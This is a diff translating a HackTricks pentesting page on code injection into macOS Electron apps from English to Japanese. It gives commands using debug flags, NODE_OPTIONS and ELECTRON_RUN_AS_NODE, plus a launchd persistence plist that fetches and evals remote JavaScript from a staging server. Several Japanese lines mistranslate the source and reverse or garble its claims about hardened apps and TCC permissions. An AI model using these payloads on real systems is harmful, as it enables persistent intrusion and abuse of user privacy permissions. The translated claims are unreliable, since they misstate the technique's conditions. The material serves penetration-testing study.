@@ -1,27 +1,27 @@
-# macOS Electron Applications Injection
+# macOS Electronアプリケーションのインジェクション
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## Adding code to Electron Applications
+## Electronアプリケーションへのコードの追加
 
-The JS code of an Electron App is not signed, so an attacker could move the app to a writable location, inject malicious JS code and launch that app and abuse the TCC permissions.
+ElectronアプリのJSコードは署名されていないため、攻撃者はアプリを書き込み可能な場所に移動し、悪意のあるJSコードをインジェクションしてそのアプリを起動し、TCCの権限を乱用することができます。
 
-However, the **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
+ただし、**`kTCCServiceSystemPolicyAppBundles`**権限を変更するには、**必要です**。したがって、デフォルトではこれはもはや可能ではありません。
 
-## Inspect Electron Application
+## Electronアプリケーションの検査
 
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
-For example:
+[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`**などのフラグを使用してElectronアプリケーションを実行すると、**デバッグポートが開かれ**、それに接続することができます（たとえば、Chromeの`chrome://inspect`から）そして、**コードをインジェクト**したり、新しいプロセスを起動したりすることができます。\
+例えば：
 
 {% code overflow="wrap" %}
 ```bash
@@ -32,18 +32,16 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Note that now **hardened** Electron applications with **RunAsNode** disabled will **ignore node parameters** (such as --inspect) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set.
-
-However, you could still use the electron param `--remote-debugging-port=9229` but the previous payload won't work to execute other processes.
+注意してください。**hardened** Electronアプリケーションでは、**RunAsNode**が無効になっているため、起動時に--inspectなどのノードパラメータは**無視されます**。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、electronパラメータ`--remote-debugging-port=9229`を使用することができますが、以前のペイロードは他のプロセスを実行するためには機能しません。
 {% endhint %}
 
 ## `NODE_OPTIONS`
 
 {% hint style="warning" %}
-This env variable would only work if the Electron application hasn't been properly hardened and is allowing it. If hardened, you would also need to use the **env variable `ELECTRON_RUN_AS_NODE`**.
+この環境変数は、Electronアプリケーションが適切にハード化されており、それを許可している場合にのみ機能します。ハード化されている場合は、**環境変数`ELECTRON_RUN_AS_NODE`**も使用する必要があります。
 {% endhint %}
 
-With this combination you could store the payload in a different file and execute that file:
+この組み合わせを使用すると、ペイロードを別のファイルに保存してそのファイルを実行できます：
 
 {% code overflow="wrap" %}
 ```bash
@@ -53,11 +51,9 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
-{% endcode %}
-
 ## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), if this env variable is set, it will start the process as a normal Node.js process.
+[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)によると、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして開始されます。
 
 {% code overflow="wrap" %}
 ```bash
@@ -68,40 +64,38 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 ```
 {% endcode %}
 
-As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
-
+[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数をplist内で悪用して持続性を維持することができます。
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-    </dict>
-    <key>Label</key>
-    <string>com.xpnsec.hideme</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>-e</string>
-        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+</dict>
+<key>Label</key>
+<string>com.xpnsec.hideme</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>-e</string>
+<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
